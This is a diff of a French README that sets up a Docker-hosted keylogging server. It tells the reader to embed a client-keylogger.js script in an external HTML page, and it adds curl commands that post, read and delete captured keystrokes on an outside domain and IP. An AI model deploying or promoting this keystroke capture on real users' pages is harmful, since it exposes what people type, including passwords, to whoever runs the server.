@@ -39,13 +39,7 @@ Inclure le fichier `client-keylogger.js` dans ta page HTML externe.
      - ou http://146.190.136.86
    - curl -X POST http://nodekey.skandy.online/keylog -H "Content-Type: application/json" -d '{"key":"A"}'
 
-3. **Tester l’enregistrement des touches**
-   - Crée une page HTML locale avec le script fourni (voir ci-dessous)
-   - Ouvre la page dans ton navigateur, tape sur le clavier
-   - Les touches doivent s’enregistrer dans `/root/keylog.txt` sur le serveur (vérifie avec `docker exec` ou en te connectant en SSH)
-   ```bash
-   docker exec -it nodekeylog-server cat /root/keylog.txt
-   ```
+
 # 1. Mettre à jour les paquets
 sudo apt-get update
 sudo apt-get install -y ca-certificates curl gnupg lsb-release
@@ -67,13 +61,6 @@ echo \
 # 6. Mettre à jour et installer Docker
 sudo apt-get update
 sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
-
-
----
-
-**Remarque :**
-- Pour HTTPS, il faudra ajouter une configuration supplémentaire (Let’s Encrypt, etc).
-- Pour toute question ou amélioration, ouvre une issue ou contacte le mainteneur.
 
 ---
 
@@ -98,7 +85,7 @@ error mounting "/root/keylog.txt" ... not a directory: unknown: Are you trying t
    ```
 3. Relance les conteneurs :
    ```bash
-   docker-compose up -d --build
+   docker compose up -d --build
    ```
 
 ### Tester l’API avec curl
@@ -115,5 +102,12 @@ Et voir la lettre dans `/root/keylog.txt` :
 ```bash
 cat /root/keylog.txt
 ```
+### commande api 
+
+curl http://nodekey.skandy.online/health
+
+curl -X DELETE http://nodekey.skandy.online/keylog
+
+curl http://nodekey.skandy.online/keylog
 
 ---
